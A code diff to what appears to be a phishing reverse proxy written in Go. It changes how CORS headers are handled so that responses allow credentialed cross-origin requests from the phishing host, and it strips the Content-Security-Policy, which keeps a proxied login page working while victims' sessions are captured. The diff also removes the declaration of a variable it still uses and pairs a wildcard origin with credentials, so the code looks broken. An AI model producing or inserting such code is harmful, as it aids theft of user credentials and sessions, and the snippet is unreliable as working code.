@@ -421,10 +421,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
-			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
-			if allow_origin != "" {
+			if (allow_origin != "") {
+				u, _ := url.Parse(allow_origin)
+				if r_host, ok := p.replaceHostWithPhished(u.Host); ok {
+					resp.Header.Set("Access-Control-Allow-Origin", u.Scheme + "://" + r_host)
+					resp.Header.Set("Access-Control-Allow-Credentials", "true")
+				}
+			} else {
 				resp.Header.Set("Access-Control-Allow-Origin", "*")
+				resp.Header.Set("Access-Control-Allow-Credentials", "true")
 			}
+			
 			resp.Header.Del("Content-Security-Policy")
 
 			redirect_set := false
